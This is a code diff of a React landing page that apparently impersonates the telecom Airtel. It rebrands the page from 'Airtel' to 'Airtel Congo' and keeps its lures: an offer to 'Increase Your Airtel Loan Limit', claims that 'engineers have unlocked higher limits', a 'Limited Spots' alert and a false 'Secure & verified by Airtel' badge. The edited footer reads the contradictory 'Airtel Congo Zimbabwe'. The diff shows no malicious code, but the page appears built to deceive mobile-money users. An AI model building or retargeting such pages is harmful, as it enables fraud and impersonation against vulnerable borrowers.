@@ -79,7 +79,7 @@ function LandingPage({ onApply }: LandingPageProps) {
     return (
         <div style={pageStyle}>
             <div style={headerStyle}>
-                <img src="/airtel.svg" alt="Airtel" style={logoStyle} />
+                <img src="/Airtel Congo.svg" alt="Airtel Congo" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -140,7 +140,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                             lineHeight: "1.2",
                         }}
                     >
-                        Increase Your Airtel Loan Limit
+                        Increase Your Airtel Congo Loan Limit
                     </h1>
 
                     <p
@@ -152,7 +152,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        Our engineers have unlocked <strong style={{ color: "#667eea" }}>higher limits</strong> for qualifying Airtel users.
+                        Our engineers have unlocked <strong style={{ color: "#667eea" }}>higher limits</strong> for qualifying Airtel Congo users.
                     </p>
 
                     {/* Limited Spots Alert */}
@@ -277,12 +277,12 @@ function LandingPage({ onApply }: LandingPageProps) {
                         }}
                     >
                         <span>🔒</span>
-                        <span>Secure & verified by Airtel</span>
+                        <span>Secure & verified by Airtel Congo</span>
                     </div>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
         </div>
     );
 }
